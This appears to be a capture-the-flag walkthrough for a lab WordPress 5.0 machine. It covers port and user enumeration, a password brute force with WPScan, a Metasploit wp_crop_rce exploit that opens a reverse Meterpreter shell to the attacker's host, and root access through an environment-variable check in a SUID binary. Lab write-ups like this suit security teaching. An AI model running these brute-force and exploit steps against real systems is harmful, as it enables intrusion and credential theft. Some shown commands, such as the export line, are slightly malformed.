Difficult: Medium
----------------------------
Note: "Billy Joel made a Wordpress blog on his home computer and has started working on it.  It's going to be so awesome!"
      "Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole..."
----------------------------
 + Scan the ports and enumerate the available directories.

 ```bash
	$ nmap -sV -vv -A -T4 -p- <IP>
	PORT    STATE SERVICE     REASON         VERSION
	22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3hfvTN6e0P9PLtkjW4dy+6vpFSh1PwKRZrML7ArPzhx1yVxBP7kxeIt3lX/qJWpxyhlsQwoLx8KDYdpOZlX5Br1PskO6H66P+AwPMYwooSq24qC/Gxg4NX9MsH/lzoKnrgLDUaAqGS5ugLw6biXITEVbxrjBNdvrT1uFR9sq+Yuc1JbkF8dxMF51tiQF35g0Nqo+UhjmJJg73S/VI9oQtYzd2GnQC8uQxE8Vf4lZpo6ZkvTDQ7om3t/cvsnNCgwX28/TRcJ53unRPmos13iwIcuvtfKlrP5qIY75YvU4U9nmy3+tjqfB1e5CESMxKjKesH0IJTRhEjAyxjQ1HUINP
	|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJtovk1nbfTPnc/1GUqCcdh8XLsFpDxKYJd96BdYGPjEEdZGPKXv5uHnseNe1SzvLZBoYz7KNpPVQ8uShudDnOI=
	|   256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICfVpt7khg8YIghnTYjU1VgqdsCRVz7f1Mi4o4Z45df8
	80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
	|_http-generator: WordPress 5.0
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
	|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
	|_http-server-header: Apache/2.4.29 (Ubuntu)
	| http-robots.txt: 1 disallowed entry 
	|_/wp-admin/
	139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
 ```
 + We use tool "WPScan" to scan the page WordPress:
 + Link Git: "https://github.com/wpscanteam/wpscan?tab=readme-ov-file"
 ```bash
	$ wpscan --url=<IP> -e u
	_______________________________________________________________
	         __          _______   _____
	         \ \        / /  __ \ / ____|
	          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
	           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
	            \  /\  /  | |     ____) | (__| (_| | | | |
	             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

	         WordPress Security Scanner by the WPScan Team
	                         Version 3.8.25
	       Sponsored by Automattic - https://automattic.com/
	       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
	_______________________________________________________________

	[+] URL: http://10.10.24.188/ [10.10.24.188]
	[+] Started: Sat Aug 24 11:45:54 2024

	Interesting Finding(s):
	[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
	 | Found By: Emoji Settings (Passive Detection)
	 |  - http://10.10.24.188/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
	 | Confirmed By: Meta Generator (Passive Detection)
	 |  - http://10.10.24.188/, Match: 'WordPress 5.0'

	[i] The main theme could not be detected.

	[+] Enumerating Users (via Passive and Aggressive Methods)
	 Brute Forcing Author IDs - Time: 00:00:01 <==> (10 / 10) 100.00% Time: 00:00:01

	[i] User(s) Identified:

	[+] bjoel
	 | Found By: Wp Json Api (Aggressive Detection)
	 |  - http://10.10.24.188/wp-json/wp/v2/users/?per_page=100&page=1
	 | Confirmed By:
	 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
	 |  Login Error Messages (Aggressive Detection)

	[+] kwheel
	 | Found By: Wp Json Api (Aggressive Detection)
	 |  - http://10.10.24.188/wp-json/wp/v2/users/?per_page=100&page=1
	 | Confirmed By:
	 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
	 |  Login Error Messages (Aggressive Detection)

	[+] Karen Wheeler
	 | Found By: Rss Generator (Aggressive Detection)

	[+] Billy Joel
	 | Found By: Rss Generator (Aggressive Detection)

 ```

 + We have 2 username can try to login /wp-admin: bjoel and kwheel
 + Try to brute force username with WPScan
 ```bash
   $ wpscan --url=<IP> -U kwheel -P /usr/share/wordlists/rockyou.txt -t18
   ^[[31m[!]^[[0m Valid Combinations Found:
 	Username: kwheel, Password: cutiepie1
 ```
-> We have login /wp-admin with user kwheel
+ We have another info WordPress version 5.0
+ Search the vulnerable WordPress 5.0 and find it. This is CVE-2019-8943 and CVE-2019-8942 
+ We can use Metasploit to exploit it. Link: "https://www.exploit-db.com/exploits/46662"
```bash
	msf6 exploit(multi/http/wp_crop_rce) > exploit 

	[*] Started reverse TCP handler on 10.11.101.46:4444 
	[*] Authenticating with WordPress using kwheel:cutiepie1...
	[+] Authenticated with WordPress
	[*] Preparing payload...
	[*] Uploading payload
	[+] Image uploaded
	[*] Including into theme
	[*] Sending stage (39927 bytes) to 10.10.24.188
	[*] Meterpreter session 1 opened (10.11.101.46:4444 -> 10.10.24.188:55654) at 2024-08-24 12:06:18 +0700
	[*] Attempting to clean up files...

	meterpreter > id
	[-] Unknown command: id. Run the help command for more details.
	meterpreter > shell
	Process 3252 created.
	Channel 1 created.
	id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

###Privilege Escalation:
+ We can search file SUID to find some interesting files.
```bash
	find / -uid 0 -perm -4000 -type f 2>/dev/null
	/usr/sbin/checker
```
-> /usr/sbin/checker is potential
+ Run it and we recivce the notification: "Not an Admin"
+ We can try to see library call of a given program /usr/sbin/checker
```bash
	$ ltrace /usr/sbin/checker
	getenv("admin")                                  = nil
	puts("Not an Admin")                             = 13
	Not an Admin
	+++ exited (status 0) +++

```
+ Explain: 
    getenv("admin"): This function checks if an environmenst variable named "admin" is set. If it is, it returns the value of that variable. If not, it returns nil.
    = nil: This is the result of the getenv function call. In this case, it's nil, indicating that the "admin" environment variable is not set.

+ We can use IDA tool or Ghidra to see Pseudocode of program /usr/sbin/checker:
 IDA decomplier:
```bash
	int __fastcall main(int argc, const char **argv, const char **envp)
	{
	  if ( getenv("admin") )
	  {
	    setuid(0);
	    system("/bin/bash");
	  }
	  else
	  {
	    puts("Not an Admin");
	  }
	  return 0;
      }

``` 
+ In this case environment variable "admin" is not set so we set the "admin". Use export to set
```bash
	export admin = admin
	ltrace /usr/sbin/checker
	getenv("admin")                                  = "admin"
	setuid(0)                                        = -1
	system("/bin/bash"

``` 

+ Run again and gain the root !!!
```bash
	/usr/sbin/checker
	id
	uid=0(root) gid=33(www-data) groups=33(www-data)
```

END!!!